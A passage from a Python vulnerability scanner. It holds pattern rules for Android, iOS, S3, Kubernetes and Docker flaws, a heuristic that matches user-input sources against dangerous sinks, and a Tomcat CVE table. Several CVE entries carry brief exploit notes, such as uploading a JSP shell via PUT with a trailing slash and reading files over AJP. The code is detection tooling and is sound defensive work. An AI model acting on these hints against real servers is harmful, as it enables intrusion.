        keywords=["int ", "char ", "void *", "struct "],
        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
    ),
    
    # === MOBILE (Android/iOS) ===
    
    "Android WebView JavaScript": VulnPattern(
        cwe="CWE-749",
        cwe_name="Exposed Dangerous Method or Function",
        owasp="M1:2016-Improper Platform Usage",
        severity="High",
        keywords=["setJavaScriptEnabled(true)", "addJavascriptInterface",
                  "setAllowFileAccess(true)", "setAllowUniversalAccessFromFileURLs"],
        anti_keywords=["setJavaScriptEnabled(false)", "setAllowFileAccess(false)"],
        exploit_hints="Execute JavaScript in WebView context",
        valid_extensions=[".java", ".kt"]
    ),
    
    "Android Insecure Storage": VulnPattern(
        cwe="CWE-312",
        cwe_name="Cleartext Storage of Sensitive Information",
        owasp="M2:2016-Insecure Data Storage",
        severity="High",
        keywords=["SharedPreferences", "getSharedPreferences", "MODE_WORLD_READABLE",
                  "MODE_WORLD_WRITEABLE", "SQLiteDatabase"],
        anti_keywords=["EncryptedSharedPreferences", "MODE_PRIVATE", "encrypted"],
        valid_extensions=[".java", ".kt"]
    ),
    
    "iOS Keychain Misuse": VulnPattern(
        cwe="CWE-522",
        cwe_name="Insufficiently Protected Credentials",
        owasp="M2:2016-Insecure Data Storage",
        severity="High",
        keywords=["UserDefaults", "NSUserDefaults", "kSecAttrAccessibleAlways"],
        anti_keywords=["Keychain", "kSecAttrAccessibleWhenUnlocked"],
        valid_extensions=[".swift", ".m"]
    ),
    
    # === CLOUD/INFRASTRUCTURE ===
    
    "AWS S3 Public Access": VulnPattern(
        cwe="CWE-284",
        cwe_name="Improper Access Control (S3 Bucket)",
        owasp="A01:2021-Broken Access Control",
        severity="Critical",
        keywords=["s3:*", "Principal: \"*\"", "PublicAccessBlockConfiguration",
                  "BlockPublicAcls: false", "GrantRead=uri=http://acs.amazonaws.com/groups/global/AllUsers"],
        anti_keywords=["BlockPublicAcls: true", "RestrictPublicBuckets: true"],
        exploit_hints="Access or list public S3 bucket contents"
    ),
    
    "Kubernetes RBAC Misconfiguration": VulnPattern(
        cwe="CWE-732",
        cwe_name="Incorrect Permission Assignment for Critical Resource",
        owasp="A01:2021-Broken Access Control",
        severity="High",
        keywords=["cluster-admin", "system:masters", "resources: [\"*\"]",
                  "verbs: [\"*\"]", "apiGroups: [\"*\"]"],
        anti_keywords=["resources: [specific", "verbs: [get, list"],
        valid_extensions=[".yaml", ".yml"]
    ),
    
    "Docker Privileged Mode": VulnPattern(
        cwe="CWE-250",
        cwe_name="Execution with Unnecessary Privileges",
        owasp="A05:2021-Security Misconfiguration",
        severity="Critical",
        keywords=["--privileged", "privileged: true", "CAP_SYS_ADMIN",
                  "hostNetwork: true", "hostPID: true"],
        anti_keywords=["privileged: false", "readOnlyRootFilesystem: true"],
        exploit_hints="Escape container to host system",
        valid_extensions=[".yaml", ".yml", ".dockerfile", ""]
    ),
}



class VulnPatternClassifier:
    """
    Pattern-based vulnerability classifier.
    Uses verified patterns instead of LLM guessing for 100% accuracy.
    """
    
    def __init__(self):
        self.patterns = VULN_PATTERNS
    
    def classify(self, code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
        """
        Classify vulnerability based on code patterns and extension.
        
        Returns:
            Dict with cwe, owasp, severity, type if match found
            None if no known vulnerability pattern matches
        """
        code_lower = code_snippet.lower()
        _, ext = os.path.splitext(file_path)
        ext = ext.lower()
        
        for vuln_type, pattern in self.patterns.items():
            # Check file extension validity first (if defined)
            if pattern.valid_extensions:
                if ext not in pattern.valid_extensions:
                    continue
            
            # Check keywords (case-insensitive)
            keywords_found = False
            for kw in pattern.keywords:
                 # Improve matching: try to match whole words for short keywords if possible
                 # But for now, just checking presence is faster, relying on extension filter for safety.
                 if kw in code_snippet or kw.lower() in code_lower:
                     keywords_found = True
                     break
            
            if not keywords_found:
                continue
            
            # Check anti-keywords (if present, NOT vulnerable)
            if pattern.anti_keywords:
                anti_found = any(ak in code_snippet or ak.lower() in code_lower 
                               for ak in pattern.anti_keywords)
                if anti_found:
                    logger.debug(f"Anti-keyword found, skipping {vuln_type}")
                    continue
            
            # Match found!
            logger.info(f"[PATTERN MATCH] {vuln_type} ({pattern.cwe})")
            
            return {
                "cwe": pattern.cwe,
                "cwe_name": pattern.cwe_name,
                "owasp": pattern.owasp,
                "severity": pattern.severity,
                "type": vuln_type,
                "exploit_hints": pattern.exploit_hints,
                "cve_examples": pattern.cve_examples,
                "confidence": "high",
                "source": "pattern_database"
            }
        
        return None
    
    def classify_all(self, code_snippet: str, file_path: str = "") -> List[Dict[str, Any]]:
        """Find ALL matching vulnerability patterns (not just first)."""
        matches = []
        code_lower = code_snippet.lower()
        
        for vuln_type, pattern in self.patterns.items():
            keywords_found = any(kw in code_snippet or kw.lower() in code_lower 
                                for kw in pattern.keywords)
            
            if not keywords_found:
                continue
            
            if pattern.anti_keywords:
                anti_found = any(ak in code_snippet or ak.lower() in code_lower 
                               for ak in pattern.anti_keywords)
                if anti_found:
                    continue
            
            matches.append({
                "cwe": pattern.cwe,
                "cwe_name": pattern.cwe_name,
                "owasp": pattern.owasp,
                "severity": pattern.severity,
                "type": vuln_type,
                "exploit_hints": pattern.exploit_hints,
                "cve_examples": pattern.cve_examples,
                "confidence": "high",
                "source": "pattern_database"
            })
        
        return matches


# Singleton
_pattern_classifier = None

def get_pattern_classifier() -> VulnPatternClassifier:
    """Get the singleton pattern classifier."""
    global _pattern_classifier
    if _pattern_classifier is None:
        _pattern_classifier = VulnPatternClassifier()
    return _pattern_classifier


def classify_by_pattern(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
    """Convenience function for quick pattern-based classification."""
    return get_pattern_classifier().classify(code_snippet, file_path)


def classify_generic_heuristic(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
    """
    Generic heuristic-based classification for unknown/novel vulnerabilities.
    
    This function analyzes code structure and patterns to infer potential
    vulnerability types even when exact pattern matching fails.
    
    Uses a scoring system based on:
    1. Input sources (user-controlled data)
    2. Dangerous sinks (where data is used unsafely) 
    3. Missing sanitization patterns
    4. Data flow indicators
    
    Returns:
        Dict with suggested CWE, type, and medium confidence
        None if no suspicious patterns found
    """
    code_lower = code_snippet.lower()
    _, ext = os.path.splitext(file_path)
    ext = ext.lower()
    
    # === INPUT SOURCES (user-controlled data entry points) ===
    input_sources = [
        # Java/Servlet
        "request.getParameter", "request.getHeader", "request.getCookies",
        "getInputStream", "getReader", "getQueryString", "getPathInfo",
        # PHP
        "$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_SERVER", "$_FILES",
        # Python
        "request.args", "request.form", "request.data", "request.json",
        "input(", "sys.argv", "os.environ",
        # Node.js
        "req.body", "req.params", "req.query", "req.headers",
        # Generic
        "user_input", "argv[", "fgets(", "scanf(", "read(",
    ]
    
    # === DANGEROUS SINKS by category ===
    sink_categories = {
        "CWE-78": {  # Command Injection
            "sinks": ["exec(", "system(", "popen(", "shell_exec", "Runtime.exec",
                     "ProcessBuilder", "subprocess", "os.system", "os.popen"],
            "type": "Potential Command Injection",
            "severity": "Critical"
        },
        "CWE-89": {  # SQL Injection
            "sinks": ["executeQuery", "executeUpdate", "execute(", "cursor.execute",
                     "query(", "rawQuery", "createStatement", "$sql"],
            "type": "Potential SQL Injection",
            "severity": "Critical"
        },
        "CWE-22": {  # Path Traversal
            "sinks": ["open(", "fopen(", "file_get_contents", "include(", "require(",
                     "readFile", "writeFile", "FileInputStream", "FileOutputStream"],
            "type": "Potential Path Traversal",
            "severity": "High"
        },
        "CWE-79": {  # XSS
            "sinks": ["innerHTML", "outerHTML", "document.write", "response.getWriter",
                     "out.print", "echo", "print(", "dangerouslySetInnerHTML"],
            "type": "Potential Cross-Site Scripting (XSS)",
            "severity": "High"
        },
        "CWE-502": {  # Deserialization
            "sinks": ["readObject", "ObjectInputStream", "unserialize", "pickle.load",
                     "yaml.load", "json.loads", "marshal.load", "XMLDecoder"],
            "type": "Potential Insecure Deserialization",
            "severity": "Critical"
        },
        "CWE-611": {  # XXE
            "sinks": ["XMLInputFactory", "DocumentBuilderFactory", "SAXParser",
                     "XMLReader", "parseXML", "xml.etree", "lxml.etree"],
            "type": "Potential XML External Entity (XXE)",
            "severity": "High"
        },
        "CWE-918": {  # SSRF
            "sinks": ["openConnection", "HttpClient", "RestTemplate", "urlopen",
                     "requests.get", "requests.post", "fetch(", "curl_exec"],
            "type": "Potential Server-Side Request Forgery (SSRF)",
            "severity": "High"
        },
        "CWE-94": {  # Code Injection
            "sinks": ["eval(", "exec(", "compile(", "Function(", "setTimeout(",
                     "setInterval(", "new Function", "reflection.invoke"],
            "type": "Potential Code Injection",
            "severity": "Critical"
        },
        "CWE-119": {  # Buffer Overflow
            "sinks": ["strcpy(", "strcat(", "sprintf(", "gets(", "memcpy(",
                     "memmove(", "scanf(", "vsprintf("],
            "type": "Potential Buffer Overflow",
            "severity": "Critical"
        },
    }
    
    # === SANITIZATION PATTERNS (if present, reduce risk) ===
    sanitizers = [
        "escape", "sanitize", "encode", "validate", "filter", "whitelist",
        "allowlist", "prepared", "parameterized", "htmlspecialchars",
        "addslashes", "strip_tags", "htmlentities", "encodeURIComponent",
    ]
    
    # Count input sources
    input_count = sum(1 for src in input_sources if src.lower() in code_lower)
    
    # Check for sanitization
    has_sanitization = any(san.lower() in code_lower for san in sanitizers)
    
    # Find matching sink categories
    best_match = None
    best_score = 0
    
    for cwe, category in sink_categories.items():
        sink_count = sum(1 for sink in category["sinks"] if sink.lower() in code_lower)
        
        if sink_count > 0:
            # Score = input sources + sinks - sanitization bonus
            score = input_count + sink_count
            if has_sanitization:
                score *= 0.5  # Reduce score if sanitization present
            
            if score > best_score:
                best_score = score
                best_match = {
                    "cwe": cwe,
                    "cwe_name": f"Generic Detection: {category['type']}",
                    "owasp": "A03:2021-Injection" if "Injection" in category['type'] else "Unknown",
                    "severity": category['severity'] if not has_sanitization else "Medium",
                    "type": category['type'],
                    "exploit_hints": f"User input detected: {input_count}, Dangerous sinks: {sink_count}",
                    "cve_examples": [],
                    "confidence": "medium",
                    "source": "heuristic_analysis"
                }
    
    # Only return if we have meaningful signals (input + sink)
    if best_match and input_count > 0 and best_score >= 2:
        logger.info(f"[HEURISTIC] Generic detection: {best_match['type']} (score: {best_score:.1f})")
        return best_match
    
    return None


def classify_with_fallback(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
    """
    Combined classifier: tries pattern matching first, then heuristic fallback.
    
    Returns:
        Classification dict or None
    """
    # Try pattern matching first (highest confidence)
    result = classify_by_pattern(code_snippet, file_path)
    if result:
        return result
    
    # Fall back to heuristic analysis (medium confidence)
    return classify_generic_heuristic(code_snippet, file_path)

class CVEDatabase:
    """
    Database of known CVEs mapped to software versions.
    Used in Stage 1 to enhance vulnerability detection with version-specific CVEs.
    """

    def __init__(self):
        self.cve_data = self._load_cve_database()

    def _load_cve_database(self):
        """
        Loads CVE database with version mappings.
        Format: software_name -> list of CVE entries
        """
        return {
            "apache_tomcat": [
                {
                    "cve_id": "CVE-2024-50379",
                    "cwe": "CWE-367",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "Time-of-Check Time-of-Use (TOCTOU) Race Condition in JSP compilation",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0-M1 to 11.0.1",
                        "10": "10.1.0-M1 to 10.1.33",
                        "9": "9.0.0.M1 to 9.0.97"
                    },
                    "fixed_versions": {
                        "12": "12.0.1",
                        "11": "11.0.2",
                        "10": "10.1.34",
                        "9": "9.0.98"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE via race condition when default servlet write enabled on case-insensitive filesystem",
                    "relevant_files": r'\.jsp$|JspServlet|DefaultServlet|web\.xml'
                },
                {
                    "cve_id": "CVE-2024-56337",
                    "cwe": "CWE-367",
                    "severity": "High",
                    "cvss": 8.1,
                    "description": "TOCTOU race condition in session persistence",
                    "affected_versions": {
                        "11": "11.0.0-M1 to 11.0.1",
                        "10": "10.1.0-M1 to 10.1.33",
                        "9": "9.0.0.M1 to 9.0.96"
                    },
                    "fixed_versions": {
                        "11": "11.0.2",
                        "10": "10.1.34",
                        "9": "9.0.97"
                    }
                },
                {
                    "cve_id": "CVE-2025-24813",
                    "cwe": "CWE-22",
                    "severity": "Critical",
                    "cvss": 9.1,
                    "description": "Path Traversal combined with Deserialization of Untrusted Data",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.5",
                        "10": "10.1.0 to 10.1.40",
                        "9": "9.0.0 to 9.0.105"
                    },
                    "fixed_versions": {
                        "12": "12.0.1",
                        "11": "11.0.6",
                        "10": "10.1.41",
                        "9": "9.0.106"
                    }
                },
                {
                    "cve_id": "CVE-2025-31651",
                    "cwe": "CWE-116",
                    "severity": "Medium",
                    "cvss": 6.5,
                    "description": "Improper Encoding or Escaping of Output / Control Sequences",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.3",
                        "10": "10.1.0 to 10.1.38",
                        "9": "9.0.0 to 9.0.102"
                    }
                },
                {
                    "cve_id": "CVE-2025-55754",
                    "cwe": "CWE-117",
                    "severity": "Medium",
                    "cvss": 5.3,
                    "description": "Improper Neutralization of Escape, Meta, or Control Sequences",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.4",
                        "10": "10.1.0 to 10.1.39"
                    }
                },
                {
                    "cve_id": "CVE-2025-49125",
                    "cwe": "CWE-288",
                    "severity": "High",
                    "cvss": 8.6,
                    "description": "Authentication Bypass Using an Alternate Path",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.3",
                        "10": "10.1.0 to 10.1.37",
                        "9": "9.0.0 to 9.0.101"
                    }
                },
                {
                    "cve_id": "CVE-2025-48989",
                    "cwe": "CWE-362",
                    "severity": "Medium",
                    "cvss": 6.8,
                    "description": "Concurrent Execution using Shared Resource with Improper Synchronization",
                    "affected_versions": {
                        "10": "10.1.0 to 10.1.36",
                        "9": "9.0.0 to 9.0.100"
                    }
                },
                {
                    "cve_id": "CVE-2025-48988",
                    "cwe": "CWE-370",
                    "severity": "Medium",
                    "cvss": 7.5,
                    "description": "Allocation of Resources Without Limits (Memory Leak)",
                    "affected_versions": {
                        "11": "11.0.0 to 11.0.2",
                        "10": "10.1.0 to 10.1.35"
                    }
                },
                {
                    "cve_id": "CVE-2025-53506",
                    "cwe": "CWE-370",
                    "severity": "High",
                    "cvss": 7.8,
                    "description": "Resource Allocation Without Limits (DoS)",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.3",
                        "10": "10.1.0 to 10.1.38",
                        "9": "9.0.0 to 9.0.103"
                    }
                },
                {
                    "cve_id": "CVE-2024-54677",
                    "cwe": "CWE-400",
                    "severity": "High",
                    "cvss": 7.5,
                    "description": "Uncontrolled Resource Consumption (DoS Attack)",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.1",
                        "10": "10.1.0 to 10.1.33",
                        "9": "9.0.0 to 9.0.97"
                    },
                    "fixed_versions": {
                        "12": "12.0.1",
                        "11": "11.0.2",
                        "10": "10.1.34",
                        "9": "9.0.98"
                    },
                    "exploit_available": True
                },
                {
                    "cve_id": "CVE-2025-31650",
                    "cwe": "CWE-401",
                    "severity": "Medium",
                    "cvss": 5.9,
                    "description": "Missing Release of Memory after Effective Lifetime",
                    "affected_versions": {
                        "10": "10.1.0 to 10.1.37",
                        "9": "9.0.0 to 9.0.101"
                    }
                },
                {
                    "cve_id": "CVE-2025-61795",
                    "cwe": "CWE-404",
                    "severity": "Medium",
                    "cvss": 6.2,
                    "description": "Improper Resource Shutdown or Release",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.4"
                    }
                },
                {
                    "cve_id": "CVE-2025-55752",
                    "cwe": "CWE-23",
                    "severity": "High",
                    "cvss": 8.1,
                    "description": "Relative Path Traversal",
                    "affected_versions": {
                        "12": "12.0.0-M1 to 12.0.0",
                        "11": "11.0.0 to 11.0.3",
                        "10": "10.1.0 to 10.1.38"
                    }
                },
                # ========== TOMCAT 8.5.x CRITICAL CVEs ==========
                {
                    "cve_id": "CVE-2020-1938",
                    "cwe": "CWE-284",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "Ghostcat - AJP Protocol File Read/Include (RCE possible)",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.30",
                        "8": "8.5.0 to 8.5.50",
                        "7": "7.0.0 to 7.0.99"
                    },
                    "fixed_versions": {
                        "9": "9.0.31",
                        "8": "8.5.51",
                        "7": "7.0.100"
                    },
                    "exploit_available": True,
                    "exploit_notes": "LFI/RCE via AJP port 8009. Read webapp files or achieve RCE if file upload exists.",
                    "owasp": "A01:2021-Broken Access Control",
                    "relevant_files": r"server\.xml|ajp|Connector|8009"
                },
                {
                    "cve_id": "CVE-2019-0232",
                    "cwe": "CWE-78",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "CGI Servlet Command Injection on Windows",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.17",
                        "8": "8.5.0 to 8.5.39",
                        "7": "7.0.0 to 7.0.93"
                    },
                    "fixed_versions": {
                        "9": "9.0.18",
                        "8": "8.5.40",
                        "7": "7.0.94"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE on Windows when CGI servlet enabled. Inject OS commands via CGI args.",
                    "owasp": "A03:2021-Injection",
                    "relevant_files": r"CGIServlet|\.bat$|\.cmd$|web\.xml"
                },
                {
                    "cve_id": "CVE-2020-9484",
                    "cwe": "CWE-502",
                    "severity": "High",
                    "cvss": 7.0,
                    "description": "Session Persistence Deserialization RCE",
                    "affected_versions": {
                        "10": "10.0.0-M1 to 10.0.0-M4",
                        "9": "9.0.0.M1 to 9.0.34",
                        "8": "8.5.0 to 8.5.54",
                        "7": "7.0.0 to 7.0.103"
                    },
                    "fixed_versions": {
                        "10": "10.0.0-M5",
                        "9": "9.0.35",
                        "8": "8.5.55",
                        "7": "7.0.104"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE via malicious session file when PersistentManager configured. Requires file write access.",
                    "owasp": "A08:2021-Software and Data Integrity Failures",
                    "relevant_files": r"PersistentManager|session|context\.xml"
                },
                {
                    "cve_id": "CVE-2017-12617",
                    "cwe": "CWE-434",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "PUT Method JSP Upload RCE",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.0",
                        "8": "8.5.0 to 8.5.22",
                        "7": "7.0.0 to 7.0.81"
                    },
                    "fixed_versions": {
                        "9": "9.0.1",
                        "8": "8.5.23",
                        "7": "7.0.82"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Upload JSP shell via PUT when readonly=false. Append / to bypass filter.",
                    "owasp": "A04:2021-Insecure Design",
                    "relevant_files": r"web\.xml|DefaultServlet|readonly"
                },
                {
                    "cve_id": "CVE-2017-12615",
                    "cwe": "CWE-434",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "PUT Method Arbitrary File Upload (Windows)",
                    "affected_versions": {
                        "7": "7.0.0 to 7.0.79"
                    },
                    "fixed_versions": {
                        "7": "7.0.81"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE on Windows via PUT request to upload JSP webshell when readonly=false.",
                    "owasp": "A04:2021-Insecure Design",
                    "relevant_files": r"web\.xml|DefaultServlet|readonly"
                },
                {
                    "cve_id": "CVE-2019-12418",
                    "cwe": "CWE-287",
                    "severity": "High",
                    "cvss": 7.0,
                    "description": "JMX Authentication Bypass via Local Port",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.28",
                        "8": "8.5.0 to 8.5.47",
                        "7": "7.0.0 to 7.0.97"
                    },
                    "fixed_versions": {
                        "9": "9.0.29",
                        "8": "8.5.48",
                        "7": "7.0.99"
                    },
                    "exploit_available": True,
                    "exploit_notes": "JMX Remote auth bypass when using local address. Access JMX MBeans without credentials.",
                    "owasp": "A07:2021-Identification and Authentication Failures"
                },
                {
                    "cve_id": "CVE-2020-8022",
                    "cwe": "CWE-276",
                    "severity": "High",
                    "cvss": 7.8,
                    "description": "Tomcat Manager Credential Disclosure",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.35",
                        "8": "8.5.0 to 8.5.55",
                        "7": "7.0.0 to 7.0.104"
                    },
                    "exploit_available": False,
                    "owasp": "A05:2021-Security Misconfiguration"
                },
                {
                    "cve_id": "CVE-2021-25122",
                    "cwe": "CWE-200",
                    "severity": "High",
                    "cvss": 7.5,
                    "description": "Request Smuggling via New HTTP/2 Connection",
                    "affected_versions": {
                        "10": "10.0.0-M1 to 10.0.0",
                        "9": "9.0.0.M1 to 9.0.41",
                        "8": "8.5.0 to 8.5.61"
                    },
                    "fixed_versions": {
                        "10": "10.0.2",
                        "9": "9.0.43",
                        "8": "8.5.63"
                    },
                    "exploit_available": True,
                    "exploit_notes": "HTTP Request Smuggling can bypass security controls.",
                    "owasp": "A03:2021-Injection"
                },
                {
                    "cve_id": "CVE-2021-25329",
                    "cwe": "CWE-502",
                    "severity": "High",
                    "cvss": 7.0,
                    "description": "Incomplete Fix for Session Deserialization (CVE-2020-9484 variant)",
                    "affected_versions": {
                        "10": "10.0.0-M1 to 10.0.0",
                        "9": "9.0.0.M1 to 9.0.41",
                        "8": "8.5.0 to 8.5.61",
                        "7": "7.0.0 to 7.0.107"
                    },
                    "fixed_versions": {
                        "10": "10.0.2",
                        "9": "9.0.43",
                        "8": "8.5.63",
                        "7": "7.0.108"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Extends CVE-2020-9484 attack scenarios.",
                    "owasp": "A08:2021-Software and Data Integrity Failures"
                },
                # ========== TOMCAT 7.x CRITICAL CVEs ==========
                {
                    "cve_id": "CVE-2016-8735",
                    "cwe": "CWE-502",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "JmxRemoteLifecycleListener Deserialization RCE",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.0.M11",
                        "8": "8.0.0.RC1 to 8.5.6",
                        "7": "7.0.0 to 7.0.72",
                        "6": "6.0.0 to 6.0.47"
                    },
                    "fixed_versions": {
                        "9": "9.0.0.M13",
                        "8": "8.5.8",
                        "7": "7.0.73",
                        "6": "6.0.48"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE via JMX listener. Requires JmxRemoteLifecycleListener in server.xml.",
                    "owasp": "A08:2021-Software and Data Integrity Failures",
                    "relevant_files": r"JmxRemoteLifecycleListener|server\.xml|jmx"
                },
                {
                    "cve_id": "CVE-2016-5018",
                    "cwe": "CWE-284",
                    "severity": "Critical",
                    "cvss": 9.1,
                    "description": "Security Manager Bypass via Webapp ResourceLink",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.0.M9",
                        "8": "8.0.0.RC1 to 8.5.4",
                        "7": "7.0.0 to 7.0.70",
                        "6": "6.0.0 to 6.0.45"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Bypass SecurityManager via ResourceLinkFactory.",
                    "owasp": "A01:2021-Broken Access Control"
                },
                {
                    "cve_id": "CVE-2014-0050",
                    "cwe": "CWE-400",
                    "severity": "High",
                    "cvss": 7.5,
                    "description": "Apache Commons FileUpload DoS (affects Tomcat)",
                    "affected_versions": {
                        "8": "8.0.0-RC1 to 8.0.1",
                        "7": "7.0.0 to 7.0.51"
                    },
                    "fixed_versions": {
                        "8": "8.0.2",
                        "7": "7.0.52"
                    },
                    "exploit_available": True,
                    "exploit_notes": "DoS via multipart request boundary parsing.",
                    "owasp": "A05:2021-Security Misconfiguration"
                },
                {
                    "cve_id": "CVE-2014-0119",
                    "cwe": "CWE-200",
                    "severity": "Medium",
                    "cvss": 5.3,
                    "description": "XSLT Information Disclosure",
                    "affected_versions": {
                        "8": "8.0.0-RC1 to 8.0.5",
                        "7": "7.0.0 to 7.0.53",
                        "6": "6.0.0 to 6.0.40"
                    },
                    "exploit_available": False,
                    "owasp": "A01:2021-Broken Access Control"
                },
                {
                    "cve_id": "CVE-2016-0714",
                    "cwe": "CWE-284",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "Session Manager Auto Deploy Remote Code Execution",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.0.M1",
                        "8": "8.0.0.RC1 to 8.0.30",
                        "7": "7.0.0 to 7.0.67",
                        "6": "6.0.0 to 6.0.44"
                    },
                    "fixed_versions": {
                        "9": "9.0.0.M3",
                        "8": "8.0.32",
                        "7": "7.0.68",
                        "6": "6.0.45"
                    },
                    "exploit_available": True,
                    "exploit_notes": "RCE via malicious session + Manager app privileges.",
                    "owasp": "A01:2021-Broken Access Control"
                },
                {
                    "cve_id": "CVE-2016-3092",
                    "cwe": "CWE-400",
                    "severity": "High",
                    "cvss": 7.5,
                    "description": "Apache Commons FileUpload DoS (MIME boundary)",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.0.M8",
                        "8": "8.0.0.RC1 to 8.5.3",
                        "7": "7.0.0 to 7.0.69"
                    },
                    "fixed_versions": {
                        "9": "9.0.0.M10",
                        "8": "8.5.4",
                        "7": "7.0.70"
                    },
                    "exploit_available": True,
                    "exploit_notes": "CPU exhaustion DoS via crafted MIME boundary.",
                    "owasp": "A05:2021-Security Misconfiguration"
                },
                # ========== EL INJECTION (Common in Tomcat webapps) ==========
                {
                    "cve_id": "CVE-2014-0094",
                    "cwe": "CWE-917",
                    "severity": "Critical",
                    "cvss": 9.8,
                    "description": "ClassLoader Manipulation via ParametersInterceptor (Struts2/Tomcat)",
                    "affected_versions": {
                        "8": "8.0.0 to 8.5.99",
                        "7": "7.0.0 to 7.0.99"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Manipulate ClassLoader properties for RCE (commonly on Tomcat).",
                    "owasp": "A03:2021-Injection",
                    "relevant_files": r"struts|ParametersInterceptor|Action\.java"
                },
                {
                    "cve_id": "CVE-2018-1305",
                    "cwe": "CWE-284",
                    "severity": "Medium",
                    "cvss": 6.5,
                    "description": "Security Constraint Bypass via URL Mapping",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.5",
                        "8": "8.5.0 to 8.5.27",
                        "8.0": "8.0.0.RC1 to 8.0.50",
                        "7": "7.0.0 to 7.0.85"
                    },
                    "fixed_versions": {
                        "9": "9.0.6",
                        "8": "8.5.28",
                        "7": "7.0.86"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Bypass security constraints in web.xml via URL mangling.",
                    "owasp": "A01:2021-Broken Access Control"
                },
                {
                    "cve_id": "CVE-2018-11784",
                    "cwe": "CWE-601",
                    "severity": "Medium",
                    "cvss": 4.3,
                    "description": "Open Redirect when Default Servlet handles redirect",
                    "affected_versions": {
                        "9": "9.0.0.M1 to 9.0.11",
                        "8": "8.5.0 to 8.5.33",
                        "7": "7.0.23 to 7.0.90"
                    },
                    "fixed_versions": {
                        "9": "9.0.12",
                        "8": "8.5.34",
                        "7": "7.0.91"
                    },
                    "exploit_available": True,
                    "exploit_notes": "Redirect users to malicious site.",
                    "owasp": "A01:2021-Broken Access Control"
                }
            ]
        }

    def detect_version(self, code_content, file_path):
        """
        Attempts to detect software version from code or file metadata.
        Returns: (software_name, version) or (None, None)
        """
        # Tomcat detection patterns
        tomcat_patterns = [
            r'org\.apache\.catalina',
            r'org\.apache\.tomcat',
            r'javax\.servlet',
            r'jakarta\.servlet',
            r'<servlet>',
            r'web\.xml',
            r'\.jsp$',
            r'WEB-INF'
        ]

        # Check if it's a Tomcat-related file
        is_tomcat = any(re.search(pattern, code_content, re.IGNORECASE) or
                       re.search(pattern, file_path, re.IGNORECASE)
                       for pattern in tomcat_patterns)

        if not is_tomcat:
            return None, None

        # ENHANCED: Try to extract version from multiple sources

        # 1. Check file path for version (e.g., tomcat-9.0.95/...)
        path_version_patterns = [
            r'tomcat[/-](\d+\.\d+\.\d+)',
            r'apache-tomcat[/-](\d+\.\d+\.\d+)',
        ]
        for pattern in path_version_patterns:
            match = re.search(pattern, file_path, re.IGNORECASE)
            if match:
                detected_version = match.group(1)
                logger.info(f"Detected Tomcat version from path: {detected_version}")
                return "apache_tomcat", detected_version

        # 2. Check for build.properties.default file (Tomcat source code)
        if "tomcat" in file_path.lower():
            # Try to find and read build.properties.default
            import pathlib
            path_obj = pathlib.Path(file_path)

            # Search up the directory tree for build.properties.default
            for parent in [path_obj.parent] + list(path_obj.parents):
                build_props = parent / "build.properties.default"
                if build_props.exists():
                    try:
                        with open(build_props, 'r', encoding='utf-8') as f:
                            props_content = f.read()

                        # Extract version.major, version.minor, version.build
                        major = re.search(r'version\.major=(\d+)', props_content)
                        minor = re.search(r'version\.minor=(\d+)', props_content)
                        build = re.search(r'version\.build=(\d+)', props_content)

                        if major and minor and build:
                            detected_version = f"{major.group(1)}.{minor.group(1)}.{build.group(1)}"
                            logger.info(f"Detected Tomcat version from build.properties.default: {detected_version}")
                            return "apache_tomcat", detected_version
                    except Exception as e:
                        logger.debug(f"Failed to read build.properties.default: {e}")
                    break  # Only check up to first parent with build.properties

        # 3. Check code content for version strings
        code_version_patterns = [
            r'Apache Tomcat[/\s]+(\d+\.\d+\.\d+)',
            r'tomcat-(\d+\.\d+\.\d+)',
            r'VERSION\s*=\s*["\'](\d+\.\d+\.\d+)["\']',
            r'version\s*=\s*["\'](\d+\.\d+\.\d+)["\']',
            r'ServerInfo\.getServerInfo\(\)[^\d]*(\d+\.\d+\.\d+)',
            # Maven/Gradle dependencies
